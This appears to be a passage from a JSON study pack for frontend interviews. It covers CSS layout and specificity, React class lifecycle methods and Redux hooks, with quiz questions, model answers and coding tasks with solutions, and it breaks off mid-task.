          "content": "CSS (Cascading Style Sheets) is a cornerstone of web development, defining the presentation and layout of web pages. Understanding its core concepts is crucial for effective frontend development.\n\n### The CSS Box Model\nThe CSS Box Model is a fundamental concept that describes how elements are rendered on a page as rectangular boxes. Every element on a web page is treated as a box, consisting of four distinct areas, from the innermost to the outermost:\n\n*   **Content Area**: The actual content of the element (e.g., text, images). Its dimensions are defined by `width` and `height` properties.\n*   **Padding**: Transparent space immediately surrounding the content. It adds space between the content and the border. Padding is affected by the background color of the element.\n*   **Border**: A line that surrounds the padding and content. You can set its `width`, `style`, and `color`.\n*   **Margin**: Transparent space outside the border, used to separate the element from other elements. Margins do not take a background color.\n\nBy default, the `width` and `height` CSS properties apply to the *content area* only. This is known as the `content-box` model. However, using `box-sizing: border-box;` changes this behavior, so `width` and `height` include padding and border, making layout calculations more intuitive.\n\n<img src=\"https://www.w3.org/TR/CSS2/images/box-model.png\" alt=\"CSS Box Model Diagram\">\n\n### CSS `position` Property\nThe `position` property specifies the type of positioning method used for an element. Combined with `top`, `bottom`, `left`, and `right` properties, it determines the final position of an element.\n\n*   **`position: static` (Default)**: Elements are positioned according to the normal document flow. `top`, `bottom`, `left`, `right` properties have no effect.\n*   **`position: relative`**: The element is positioned relative to its *normal position* in the document flow. Setting `top`, `bottom`, `left`, `right` values will offset it from that normal position without affecting the position of other elements (its original space is preserved).\n*   **`position: absolute`**: The element is removed from the normal document flow. It is positioned relative to its *nearest positioned ancestor* (an ancestor with `position` other than `static`). If no such ancestor exists, it's positioned relative to the initial containing block (usually the `<html>` element). Absolute elements do not take up space in the layout.\n*   **`position: fixed`**: The element is removed from the normal document flow and positioned relative to the *viewport*. This means it stays in the same place even when the page is scrolled. Useful for persistent headers, footers, or sidebars.\n*   **`position: sticky`**: A hybrid of `relative` and `fixed`. The element is positioned according to the normal flow until it reaches a specified scroll position, at which point it 'sticks' to that position (like `fixed`).\n\n### `display: none` vs `visibility: hidden`\nBoth properties hide an element, but they do so differently, with significant implications for layout:\n\n*   **`display: none`**: This property completely removes the element from the document flow. It's as if the element never existed. It does not occupy any space on the page, and its descendants are also hidden. This can cause the layout to reflow.\n*   **`visibility: hidden`**: This property hides the element, but it *still occupies its original space* in the document flow. The element becomes invisible, but its dimensions still affect the layout of other elements. Its descendants can be made visible by setting `visibility: visible` on them.\n\n### CSS Preprocessors\nCSS preprocessors are scripting languages that extend the capabilities of CSS. They allow you to write CSS in a more programmatic way, with features not available in standard CSS, and then compile that code into regular CSS that web browsers can understand. Popular preprocessors include Sass (Syntactically Awesome Style Sheets), Less, and Stylus.\n\n**Why use them?**\n*   **Variables**: Define reusable values like colors, fonts, or common spacing. Makes design changes much easier.\n*   **Nesting**: Nest CSS selectors to reflect the HTML structure, improving readability and organization.\n*   **Mixins**: Create reusable blocks of CSS declarations to avoid repetition (like functions in programming).\n*   **Functions**: Perform calculations or manipulate colors.\n*   **Partials/Imports**: Break CSS into smaller, more manageable files and import them into a single master file.\n\nPreprocessors enhance maintainability, modularity, and reduce repetition in large stylesheets.\n\n### CSS Specificity\nSpecificity is the algorithm browsers use to determine which CSS declaration applies to an element when multiple rules target the same element. It's a weight assigned to a given CSS declaration, determined by the type and number of selectors used.\n\n**Specificity Hierarchy (from highest to lowest):**\n1.  **Inline Styles**: Styles applied directly to an HTML element (e.g., `<div style=\"color: red;\">`). Highest specificity.\n2.  **IDs**: Selectors targeting an element by its `id` attribute (e.g., `#myElement`). Each ID selector counts for 100 points.\n3.  **Classes, Attributes, and Pseudo-classes**: Selectors like `.myClass`, `[type=\"text\"]`, `:hover`, `:nth-child()`. Each counts for 10 points.\n4.  **Elements and Pseudo-elements**: Selectors like `p`, `div`, `::before`, `::after`. Each counts for 1 point.\n\n**Rules:**\n*   More specific selectors override less specific ones.\n*   If specificity is equal, the rule declared *last* in the stylesheet wins.\n*   The `!important` rule overrides all other declarations, regardless of specificity. However, its use is generally discouraged as it breaks the natural cascade and makes debugging difficult."
        },
        {
          "id": "theory_react_lifecycle_best_practices",
          "title": "React Component Lifecycle Best Practices, State Updates, and Re-rendering",
          "content": "Understanding the React component lifecycle and how to manage state and side effects is crucial for building robust and performant applications. This section focuses on common scenarios and best practices for class components.\n\n### When to Make XHR (AJAX) Requests\nXHR (XMLHttpRequest), often referred to as AJAX or asynchronous data fetching (e.g., using `fetch` or `axios`), should primarily be performed in the `componentDidMount` lifecycle method for class components. This ensures:\n\n*   The component has been rendered to the DOM, so you can safely interact with it (e.g., set state that affects rendering).\n*   The request is made only once after the initial render, preventing unnecessary network calls.\n*   You can update the component's state with the fetched data, triggering a re-render.\n\n```typescript\nimport React, { Component } from 'react';\n\ninterface MyComponentState {\n  data: any | null;\n  error: Error | null;\n  loading: boolean;\n}\n\nclass MyDataFetcher extends Component<{}, MyComponentState> {\n  constructor(props: {}) {\n    super(props);\n    this.state = {\n      data: null,\n      error: null,\n      loading: true,\n    };\n  }\n\n  componentDidMount() {\n    // console.log('Component has mounted, fetching data...');\n    fetch('https://api.example.com/data') // Replace with a real API endpoint\n      .then(response => {\n        if (!response.ok) {\n          throw new Error(`HTTP error! status: ${response.status}`);\n        }\n        return response.json();\n      })\n      .then(data => {\n        this.setState({ data, loading: false });\n        // console.log('Data fetched successfully:', data);\n      })\n      .catch(error => {\n        this.setState({ error, loading: false });\n        // console.error('Error fetching data:', error);\n      });\n  }\n\n  render() {\n    const { data, error, loading } = this.state;\n\n    if (loading) {\n      return <div>Loading data...</div>;\n    }\n    if (error) {\n      return <div>Error: {error.message}</div>;\n    }\n    return (\n      <div>\n        <h2>Data Fetched:</h2>\n        <pre>{JSON.stringify(data, null, 2)}</pre>\n      </div>\n    );\n  }\n}\n```\n\nFor functional components, the `useEffect` hook with an empty dependency array (`[]`) serves a similar purpose to `componentDidMount`.\n\n### When to Update State Based on Props\nIt's a common requirement to update a component's internal state when its props change. The approach varies depending on your React version:\n\n*   **React versions before 16.3**: Use `componentWillReceiveProps(nextProps)`.\n    This method is invoked before a mounted component receives new props. You can compare `this.props` with `nextProps` and call `this.setState()` conditionally.\n    *(Note: This method is considered unsafe and deprecated in newer React versions due to potential for bugs when used with asynchronous rendering.)*\n\n*   **React 16.3 and above**: Use `static getDerivedStateFromProps(nextProps, prevState)`.\n    This static method is called right before calling the render method, both on the initial mount and on subsequent updates. It should return an object to update the state, or `null` to indicate that nothing needs to be updated. It's purely for side-effect-free state synchronization based on props. It does not have access to the component instance (`this`).\n\n```typescript\nimport React, { Component } from 'react';\n\ninterface MyComponentProps {\n  value: number;\n}\n\ninterface MyComponentState {\n  internalValue: number;\n  derivedFromProps: boolean;\n}\n\nclass MyDerivedStateComponent extends Component<MyComponentProps, MyComponentState> {\n  constructor(props: MyComponentProps) {\n    super(props);\n    this.state = {\n      internalValue: props.value,\n      derivedFromProps: false,\n    };\n  }\n\n  static getDerivedStateFromProps(nextProps: MyComponentProps, prevState: MyComponentState) {\n    // If the 'value' prop has changed, update the 'internalValue' in state\n    if (nextProps.value !== prevState.internalValue) {\n      return {\n        internalValue: nextProps.value,\n        derivedFromProps: true, // Indicate state was derived from props\n      };\n    }\n    // No state update needed\n    return null;\n  }\n\n  render() {\n    return (\n      <div>\n        <p>Prop Value: {this.props.value}</p>\n        <p>Internal State Value: {this.state.internalValue}</p>\n        {this.state.derivedFromProps && <p>State was derived from props update!</p>}\n      </div>\n    );\n  }\n}\n```\n\nFor functional components, the `useEffect` hook with a dependency array containing the relevant prop can be used to achieve similar logic, often with cleaner patterns.\n\n### Calling `setState` in the Render Method\nCalling `setState` directly or indirectly within the `render` method is a critical anti-pattern and will lead to an infinite loop. When `setState` is called, it triggers a re-render of the component. If `setState` is inside `render`, it means every time React tries to render, it finds a `setState` call, which triggers another render, and so on. This quickly exhausts the call stack and crashes the application.\n\n**Example of an anti-pattern (DO NOT DO THIS):**\n```typescript\nimport React, { Component } from 'react';\n\nclass BadComponent extends Component<{}, { count: number }> {\n  constructor(props: {}) {\n    super(props);\n    this.state = { count: 0 };\n  }\n\n  render() {\n    // THIS WILL CAUSE AN INFINITE LOOP AND CRASH\n    this.setState({ count: this.state.count + 1 }); \n    return <div>Count: {this.state.count}</div>;\n  }\n}\n```\n\nState updates should be initiated by user events, lifecycle methods (like `componentDidMount`, `componentDidUpdate`), or external data changes, not during the rendering phase itself.\n\n### How to Force a Component to Re-render\nReact components re-render automatically when their `state` or `props` change. However, there are scenarios where you might explicitly need to trigger a re-render.\n\n1.  **Changing `state` (via `setState`)**: This is the primary and most common way to trigger a re-render. When `setState` is called, React schedules an update and re-renders the component and its children.\n    ```typescript\n    this.setState({ someKey: newValue });\n    ```\n\n2.  **Changing `props`**: When a parent component re-renders and passes new props to a child component, the child component will also re-render.\n    ```typescript\n    // In parent component's render method\n    <ChildComponent myProp={this.state.parentData} />\n    ```\n\n3.  **Using `forceUpdate()`**: This method can be used to force a re-render without changing `state` or `props`. It is generally discouraged because it bypasses React's normal `shouldComponentUpdate` checks and can lead to performance issues if not used carefully. It's typically used for very specific, edge-case scenarios (e.g., integrating with third-party libraries that don't respect React's data flow).\n    ```typescript\n    this.forceUpdate();\n    ```\n\nIn most cases, managing state and props effectively should negate the need for `forceUpdate()`. For functional components, `useState` and `useEffect` are the preferred mechanisms for managing component updates."
        }
      ],
      "questions": [
        {
          "id": "question_redux_mapdispatch_comparison",
          "topic": "Redux `mapDispatchToProps`",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following `mapDispatchToProps` definitions is the most recommended approach when using `connect` from `react-redux` for standard action creators, and why?",
          "answer": "Option D: `const mapDispatchToProps = { addTodo, toggleTodo };` because Redux automatically wraps action creators in dispatch calls, making it concise.",
          "options": [
            "Option A: `const mapDispatchToProps = (dispatch) => ({ addTodo: (text) => dispatch(addTodo(text)), toggleTodo: (id) => dispatch(toggleTodo(id)) });`",
            "Option B: `import { bindActionCreators } from 'redux'; const mapDispatchToProps = (dispatch) => ({ ...bindActionCreators({ addTodo, toggleTodo }, dispatch) });`",
            "Option C: `const mapDispatchToProps = (dispatch) => bindActionCreators({ addTodo, toggleTodo }, dispatch);`",
            "Option D: `const mapDispatchToProps = { addTodo, toggleTodo };`"
          ],
          "analysisPoints": [
            "Understanding of different `mapDispatchToProps` patterns.",
            "Knowledge of Redux `connect` behavior with object shorthand.",
            "Ability to identify recommended practices for Redux integration.",
            "Recognition of boilerplate reduction."
          ],
          "keyConcepts": [
            "mapDispatchToProps",
            "Redux `connect`",
            "Action creators",
            "bindActionCreators",
            "Redux best practices"
          ],
          "evaluationCriteria": [
            "Correctly identifies the recommended pattern.",
            "Provides accurate reasoning for the recommendation.",
            "Demonstrates understanding of Redux `connect` capabilities."
          ],
          "example": "The most recommended `mapDispatchToProps` option is the object shorthand (`Option D`). When `connect` receives an object of action creators, it automatically binds them to `dispatch`. This significantly reduces boilerplate compared to manually wrapping them (Option A) or using `bindActionCreators` explicitly within `mapDispatchToProps` (Options B and C). While `bindActionCreators` (Options B and C) also works, the object shorthand is even more concise when used directly with `connect`.",
          "tags": [
            "Redux",
            "React-Redux",
            "mapDispatchToProps",
            "Best Practices",
            "State Management"
          ],
          "prerequisites": [
            "Redux basic concepts",
            "React-Redux `connect`"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_redux_hooks_flashcard",
          "topic": "Redux Hooks",
          "level": "easy",
          "type": "flashcard",
          "question": "Which two React-Redux hooks are commonly used to interact with the Redux store in functional components?",
          "answer": "`useSelector` and `useDispatch`",
          "analysisPoints": [
            "Recall of primary Redux hooks.",
            "Understanding their respective purposes."
          ],
          "keyConcepts": [
            "Redux Hooks",
            "useSelector",
            "useDispatch"
          ],
          "evaluationCriteria": [
            "Ability to recall fundamental hooks."
          ],
          "example": "N/A",
          "tags": [
            "Redux",
            "React Hooks",
            "useSelector",
            "useDispatch"
          ],
          "prerequisites": [
            "Basic Redux concepts",
            "React Hooks"
          ],
          "complexity": 3,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_box_model_open",
          "topic": "CSS Box Model",
          "level": "medium",
          "type": "open",
          "question": "Explain the CSS Box Model and its components. How does `box-sizing: border-box;` change the default behavior?",
          "answer": "The CSS Box Model describes how elements are rendered as rectangular boxes, consisting of the content area, padding, border, and margin. The content area holds the actual content. Padding is transparent space around the content, inside the border. The border is a visible line enclosing content and padding. Margin is transparent space outside the border, separating elements.\n\nBy default, `width` and `height` properties apply only to the content area (`content-box`). When `box-sizing: border-box;` is applied, `width` and `height` include the content, padding, and border, making layout calculations more intuitive because the element's declared size corresponds to its visible size on the page.",
          "analysisPoints": [
            "Accurate description of all four box model components.",
            "Clear explanation of the default `content-box` behavior.",
            "Precise explanation of how `box-sizing: border-box;` modifies this behavior.",
            "Ability to articulate the practical benefits of `border-box`."
          ],
          "keyConcepts": [
            "CSS Box Model",
            "Content",
            "Padding",
            "Border",
            "Margin",
            "box-sizing",
            "content-box",
            "border-box"
          ],
          "evaluationCriteria": [
            "Comprehensive understanding of the box model.",
            "Ability to differentiate `content-box` and `border-box`.",
            "Clarity and completeness of explanation."
          ],
          "example": "N/A",
          "tags": [
            "CSS",
            "Box Model",
            "Layout"
          ],
          "prerequisites": [
            "Basic CSS syntax"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_position_mcq",
          "topic": "CSS Positioning",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following HTML and CSS. If `.child` is currently at `position: static`, and you want it to appear 10 pixels from the left and 10 pixels from the top *relative to its original position* while still taking up space in the document flow, what CSS property should you change on `.child`?\n\n```html\n<div class=\"parent\">\n  <div class=\"sibling-before\">Sibling Before</div>\n  <div class=\"child\">Child Element</div>\n  <div class=\"sibling-after\">Sibling After</div>\n</div>\n```\n\n```css\n.child {\n  width: 100px;\n  height: 100px;\n  background-color: lightblue;\n  /* Current: position: static; */\n}\n```",
          "answer": "`position: relative;`",
          "options": [
            "`position: absolute;`",
            "`position: fixed;`",
            "`position: relative;`",
            "`display: block;`"
          ],
          "analysisPoints": [
            "Understanding of `position: relative` behavior.",
            "Ability to distinguish between `relative`, `absolute`, and `fixed` positioning.",
            "Knowledge of how positioning affects document flow.",
            "Correct application of `top`, `bottom`, `left`, `right` properties with `relative`."
          ],
          "keyConcepts": [
            "CSS position property",
            "position: relative",
            "position: absolute",
            "position: fixed",
            "Document flow"
          ],
          "evaluationCriteria": [
            "Correctly identifies the appropriate positioning property.",
            "Demonstrates understanding of the impact on document flow and relative positioning."
          ],
          "example": "To position an element relative to its original position while keeping it in the document flow, you use `position: relative;`. After setting `position: relative;` on `.child`, you would then apply `left: 10px;` and `top: 10px;` to offset it from its normal position. `position: absolute;` and `position: fixed;` remove the element from the document flow.",
          "tags": [
            "CSS",
            "Positioning",
            "Layout"
          ],
          "prerequisites": [
            "Basic CSS layout",
            "Understanding of normal document flow"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_display_visibility_open",
          "topic": "CSS Display and Visibility",
          "level": "easy",
          "type": "open",
          "question": "What is the key difference between `display: none` and `visibility: hidden` in CSS? Provide a scenario where each would be preferred.",
          "answer": "`display: none` removes the element completely from the document flow, meaning it takes up no space, and other elements will reflow to fill its spot. `visibility: hidden` hides the element, but it still occupies its original space in the document flow, so the layout remains unchanged. \n\n**Scenario for `display: none`:** A modal dialog that is completely hidden when not active, and should not influence the layout until it's shown. Or a dynamically added/removed element.\n\n**Scenario for `visibility: hidden`:** A placeholder or a UI element that needs to retain its space even when invisible, for example, an input field that's temporarily hidden but should keep its position to prevent layout shifts, or a button that is disabled but still visible for spacing.",
          "analysisPoints": [
            "Clear distinction regarding document flow impact.",
            "Accurate description of space occupation.",
            "Relevant and practical scenarios for each property.",
            "Understanding of the visual impact on the page."
          ],
          "keyConcepts": [
            "display: none",
            "visibility: hidden",
            "Document flow",
            "CSS layout"
          ],
          "evaluationCriteria": [
            "Correctly explains the core difference.",
            "Provides appropriate examples of use cases.",
            "Demonstrates practical understanding of CSS properties."
          ],
          "example": "N/A",
          "tags": [
            "CSS",
            "Layout",
            "Display",
            "Visibility"
          ],
          "prerequisites": [
            "Basic CSS properties"
          ],
          "complexity": 4,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_preprocessors_flashcard",
          "topic": "CSS Preprocessors",
          "level": "easy",
          "type": "flashcard",
          "question": "Name three common features provided by CSS preprocessors like Sass or Less.",
          "answer": "Variables, nesting, mixins (or functions, partials/imports).",
          "analysisPoints": [
            "Recall of key preprocessor features."
          ],
          "keyConcepts": [
            "CSS Preprocessors",
            "Sass",
            "Less",
            "Variables",
            "Nesting",
            "Mixins"
          ],
          "evaluationCriteria": [
            "Ability to list essential features."
          ],
          "example": "N/A",
          "tags": [
            "CSS",
            "Preprocessors",
            "Sass",
            "Less"
          ],
          "prerequisites": [
            "Basic understanding of CSS limitations"
          ],
          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_specificity_mcq",
          "topic": "CSS Specificity",
          "level": "medium",
          "type": "mcq",
          "question": "Given the following HTML and CSS, what color will the text \"Hello World\" be?\n\n```html\n<style>\n  #my-div {\n    color: blue;\n  }\n  .container p {\n    color: red;\n  }\n  p {\n    color: green;\n  }\n</style>\n\n<div class=\"container\">\n  <p id=\"my-div\">Hello World</p>\n</div>\n```",
          "answer": "Blue",
          "options": [
            "Red",
            "Green",
            "Blue",
            "Black (default)"
          ],
          "analysisPoints": [
            "Understanding of CSS specificity rules.",
            "Correctly assigning specificity weights to different selector types (ID, class, element).",
            "Ability to determine the winning rule based on specificity hierarchy.",
            "Recognition that inline styles or `!important` are not present."
          ],
          "keyConcepts": [
            "CSS Specificity",
            "ID selector",
            "Class selector",
            "Element selector",
            "Specificity hierarchy"
          ],
          "evaluationCriteria": [
            "Correctly applies specificity rules.",
            "Identifies the selector with the highest specificity."
          ],
          "example": "The `#my-div` selector targets the element by its ID, which has the highest specificity (100 points) among the given rules. The `.container p` selector (class + element) has a specificity of 10 + 1 = 11 points. The `p` selector (element) has a specificity of 1 point. Since the ID selector has the highest specificity, its rule (`color: blue;`) will be applied, making the text blue.",
          "tags": [
            "CSS",
            "Specificity",
            "Styling"
          ],
          "prerequisites": [
            "Basic CSS selectors"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_xhr_componentdidmount_flashcard",
          "topic": "React Lifecycle for Data Fetching",
          "level": "easy",
          "type": "flashcard",
          "question": "Which React class component lifecycle method is typically used to perform XHR/AJAX requests?",
          "answer": "`componentDidMount`",
          "analysisPoints": [
            "Recall of common lifecycle methods for side effects.",
            "Understanding the 'when' aspect of `componentDidMount`."
          ],
          "keyConcepts": [
            "React Lifecycle",
            "componentDidMount",
            "XHR",
            "AJAX",
            "Data Fetching"
          ],
          "evaluationCriteria": [
            "Correctly identifies the appropriate lifecycle method."
          ],
          "example": "N/A",
          "tags": [
            "React",
            "Lifecycle",
            "Data Fetching",
            "Side Effects"
          ],
          "prerequisites": [
            "Basic React class components"
          ],
          "complexity": 3,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_react_getderivedstatefromprops_open",
          "topic": "React State Updates from Props",
          "level": "medium",
          "type": "open",
          "question": "In React 16.3+, how do you update a component's internal state based on changes in its props? Explain the method used and its characteristics.",
          "answer": "In React 16.3 and later, you use the `static getDerivedStateFromProps(nextProps, prevState)` method. This static method is invoked right before calling the render method, both on initial mount and on subsequent updates. It should return an object to update the state, or `null` to indicate that no state update is needed. Key characteristics include:\n\n1.  **Static**: It does not have access to the component instance (`this`).\n2.  **Pure Function**: It should be a pure function; it should not cause any side effects (e.g., network requests, DOM manipulation).\n3.  **Synchronization**: Its primary purpose is to synchronize internal state with props, especially when a component's state needs to be a 'derived' value from props.\n\nIt's crucial to compare `nextProps` with `prevState` to avoid unnecessary updates and potential infinite loops.",
          "analysisPoints": [
            "Identifies `getDerivedStateFromProps`.",
            "Explains its static nature and purity.",
            "Describes its purpose (synchronizing state with props).",
            "Mentions the importance of comparing `nextProps` and `prevState`.",
            "Differentiates from older `componentWillReceiveProps` implicitly."
          ],
          "keyConcepts": [
            "React Lifecycle",
            "getDerivedStateFromProps",
            "State management",
            "Props",
            "Pure functions"
          ],
          "evaluationCriteria": [
            "Provides accurate and comprehensive explanation of the method.",
            "Highlights key characteristics and best practices."
          ],
          "example": "N/A",
          "tags": [
            "React",
            "Lifecycle",
            "State Management",
            "Props"
          ],
          "prerequisites": [
            "React 16.3+ concepts",
            "React state and props"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_react_setstate_in_render_mcq",
          "topic": "React `setState` in Render",
          "level": "hard",
          "type": "mcq",
          "question": "What is the primary consequence of calling `this.setState()` directly within a React component's `render()` method?",
          "answer": "It will lead to an infinite re-rendering loop and eventually a stack overflow error.",
          "options": [
            "It will only update the state once and then stop.",
            "It will cause a warning in the console but no functional issue.",
            "It will lead to an infinite re-rendering loop and eventually a stack overflow error.",
            "It will prevent the component from rendering at all."
          ],
          "analysisPoints": [
            "Understanding of React's rendering lifecycle.",
            "Knowledge of how `setState` triggers re-renders.",
            "Ability to identify common anti-patterns and their severe consequences.",
            "Distinguishing between warnings and critical errors."
          ],
          "keyConcepts": [
            "React Render Method",
            "setState",
            "Infinite loop",
            "Stack overflow",
            "React lifecycle"
          ],
          "evaluationCriteria": [
            "Correctly identifies the severe outcome.",
            "Demonstrates deep understanding of React's update mechanism."
          ],
          "example": "When `this.setState()` is called, React re-renders the component. If this call happens inside `render()`, the re-render process will immediately trigger `render()` again, which calls `setState()` again, leading to an endless cycle. This consumes memory and eventually causes a 'Maximum update depth exceeded' warning, followed by a stack overflow error, crashing the application.",
          "tags": [
            "React",
            "Lifecycle",
            "Anti-pattern",
            "Error Handling"
          ],
          "prerequisites": [
            "React state and rendering basics"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "advanced"
        },
        {
          "id": "question_react_force_rerender_open",
          "topic": "React Re-rendering",
          "level": "medium",
          "type": "open",
          "question": "Besides `this.setState()`, what are two other ways to trigger a re-render in a React class component? When might you use `forceUpdate()` and why is it generally discouraged?",
          "answer": "Two other ways to trigger a re-render in a React class component are:\n1.  **Changing `props`**: When the parent component re-renders and passes new or updated props to a child component, the child component will also re-render.\n2.  **Using `this.forceUpdate()`**: This method forces a component to re-render without relying on state or prop changes.\n\n`forceUpdate()` might be used in very specific, rare scenarios, such as when interacting with a non-React third-party library that modifies the DOM outside of React's control, and you need to tell React to re-evaluate its component tree to catch up with those external changes. \n\nIt is generally discouraged because it bypasses React's normal update mechanism, including the `shouldComponentUpdate` lifecycle method (or `React.memo` for functional components), which is crucial for performance optimization. Using `forceUpdate()` can lead to unnecessary re-renders and performance issues, making debugging harder as it violates React's typical unidirectional data flow.",
          "analysisPoints": [
            "Identifies prop changes and `forceUpdate()` as re-render triggers.",
            "Provides a valid, albeit rare, use case for `forceUpdate()`.",
            "Clearly explains why `forceUpdate()` is generally discouraged (performance, bypassing `shouldComponentUpdate`, breaking data flow).",
            "Demonstrates awareness of React's optimization mechanisms."
          ],
          "keyConcepts": [
            "React Re-rendering",
            "setState",
            "Props",
            "forceUpdate",
            "shouldComponentUpdate",
            "Performance optimization"
          ],
          "evaluationCriteria": [
            "Accurate identification of re-render triggers.",
            "Detailed and reasoned explanation for `forceUpdate()` usage and discouragement.",
            "Demonstrates advanced React knowledge."
          ],
          "example": "N/A",
          "tags": [
            "React",
            "Performance",
            "Lifecycle",
            "Re-rendering"
          ],
          "prerequisites": [
            "React lifecycle",
            "React state and props"
          ],
          "complexity": 7,
          "interviewFrequency": 6,
          "learningPath": "advanced"
        }
      ],
      "tasks": [
        {
          "id": "task_redux_integration_refactor",
          "title": "Refactor Redux `mapDispatchToProps` with Hooks",
          "description": "\nYour task is to refactor a given React class component that uses Redux's `connect` with a manual `mapDispatchToProps` definition. You need to convert this component into a functional component that uses the `useSelector` and `useDispatch` hooks to achieve the same state management behavior. Focus on simplifying the Redux integration.\n\n**Requirements:**\n1.  Convert `ClassCounter` into a functional component `FunctionalCounter`.\n2.  Replace `connect` and `mapDispatchToProps` with `useSelector` and `useDispatch`.\n3.  Ensure the component still displays the count from Redux and dispatches `increment` and `decrement` actions when buttons are clicked.\n4.  No changes to the Redux store or action definitions are needed.\n",
          "difficulty": "medium",
          "startingCode": "import React from 'react';\nimport { connect } from 'react-redux';\n\n// Assume these actions are defined elsewhere and imported\nconst increment = () => ({ type: 'INCREMENT' });\nconst decrement = () => ({ type: 'DECREMENT' });\n\n// Redux Store (for context, not to be modified in task)\n// const initialState = { count: 0 };\n// const reducer = (state = initialState, action) => {\n//   switch (action.type) {\n//     case 'INCREMENT': return { count: state.count + 1 };\n//     case 'DECREMENT': return { count: state.count - 1 };\n//     default: return state;\n//   }\n// };\n// import { createStore } from 'redux';\n// const store = createStore(reducer);\n\n// Original Class Component using connect and mapDispatchToProps\nclass ClassCounter extends React.Component {\n  render() {\n    const { count, increment, decrement } = this.props;\n    return (\n      <div>\n        <h1>Count: {count}</h1>\n        <button onClick={increment}>Increment</button>\n        <button onClick={decrement}>Decrement</button>\n      </div>\n    );\n  }\n}\n\nconst mapStateToProps = (state) => ({\n  count: state.count,\n});\n\n// Manual mapDispatchToProps\nconst mapDispatchToProps = (dispatch) => ({\n  increment: () => dispatch(increment()),\n  decrement: () => dispatch(decrement()),\n});\n\nexport default connect(mapStateToProps, mapDispatchToProps)(ClassCounter);\n\n// You will create a new functional component below this line:\n// function FunctionalCounter() {\n//   // Your implementation here\n// }\n",
          "solutionCode": "import React from 'react';\nimport { useSelector, useDispatch } from 'react-redux';\n\n// Assume these actions are defined elsewhere and imported\nconst increment = () => ({ type: 'INCREMENT' });\nconst decrement = () => ({ type: 'DECREMENT' });\n\n// Redux Store (for context, not to be modified in task)\n// const initialState = { count: 0 };\n// const reducer = (state = initialState, action) => {\n//   switch (action.type) {\n//     case 'INCREMENT': return { count: state.count + 1 };\n//     case 'DECREMENT': return { count: state.count - 1 };\n//     default: return state;\n//   }\n// };\n// import { createStore } from 'redux';\n// const store = createStore(reducer);\n\n// Functional Component using Redux Hooks\nfunction FunctionalCounter() {\n  // Use useSelector to get state from the Redux store\n  const count = useSelector((state) => state.count);\n\n  // Use useDispatch to get the dispatch function\n  const dispatch = useDispatch();\n\n  // Define handlers to dispatch actions\n  const handleIncrement = () => {\n    dispatch(increment());\n  };\n\n  const handleDecrement = () => {\n    dispatch(decrement());\n  };\n\n  return (\n    <div>\n      <h1>Count: {count}</h1>\n      <button onClick={handleIncrement}>Increment</button>\n      <button onClick={handleDecrement}>Decrement</button>\n    </div>\n  );\n}\n\nexport default FunctionalCounter;\n",
          "testCases": [
            "Render `FunctionalCounter`: It should display 'Count: 0' initially (assuming Redux store starts at 0).",
            "Click 'Increment' button: The count display should change to 'Count: 1'.",
            "Click 'Increment' button again: The count display should change to 'Count: 2'.",
            "Click 'Decrement' button: The count display should change from 'Count: 2' to 'Count: 1'.",
            "Ensure no console errors related to Redux or React hooks."
          ],
          "hints": [
            "Remember to import `useSelector` and `useDispatch` from `react-redux`.",
            "The `useSelector` hook takes a function that receives the entire Redux state as its argument.",
            "The `useDispatch` hook returns the `dispatch` function directly.",
            "Action creators (like `increment()`) should be called when dispatching."
          ],
          "tags": [
            "Redux",
            "React Hooks",
            "Refactoring",
            "State Management"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "React Hooks basics",
            "Redux basic concepts"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "useSelector",
            "useDispatch",
            "mapDispatchToProps",
            "React functional components"
          ]
        },
        {
          "id": "task_css_positioning_layout",
          "title": "Implement a Sticky Header and Absolute Overlay",
          "description": "\nYour task is to create an HTML structure with corresponding CSS to demonstrate `position: sticky` for a header and `position: absolute` for an overlay element within a relatively positioned container.\n\n**Requirements:**\n1.  Create an HTML page with a `<body>` that includes:\n    *   A `div` with class `header` that should stick to the top of the viewport when scrolled.\n    *   A `div` with class `content` that has significant height (e.g., `150vh`) to enable scrolling.\n    *   Inside the `content` div, create a `div` with class `card` that is `position: relative`.\n    *   Inside the `card` div, create a `div` with class `overlay` that is `position: absolute` and covers the top-right corner of the `card` (e.g., 20px from top, 20px from right, 50px width/height).\n2.  Apply appropriate CSS to achieve the required positioning and visibility.\n3.  Add distinct background colors or borders to each element for clear visualization.\n",
          "difficulty": "medium",
          "startingCode": "<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Positioning Task</title>\n    <style>\n        body {\n            margin: 0;\n            font-family: sans-serif;\n        }\n        .header {\n            background-color: #333;\n            color: white;\n            padding: 20px;\n            text-align: center;\n            font-size: 24px;\n            /* Your positioning for sticky header here */\n        }\n        .content {\n            padding: 20px;\n            /* Ensure enough height to scroll */\n        }\n        .card {\n            width: 300px;\n            height: 200px;\n            background-color: #f0f0f0;\n            border: 1px solid #ccc;\n            margin: 50px auto;\n            padding: 20px;\n            /* Your positioning for relative container here */\n        }\n        .overlay {\n            background-color: rgba(255, 0, 0, 0.7);\n            color: white;\n            display: flex;\n            align-items: center;\n            justify-content: center;\n            font-size: 14px;\n            /* Your positioning for absolute overlay here */\n        }\n    </style>\n</head>\n<body>\n    <div class=\"header\">\n        Sticky Header\n    </div>\n    <div class=\"content\">\n        <p>Scroll down to see the sticky header in action.</p>\n        <p>This is 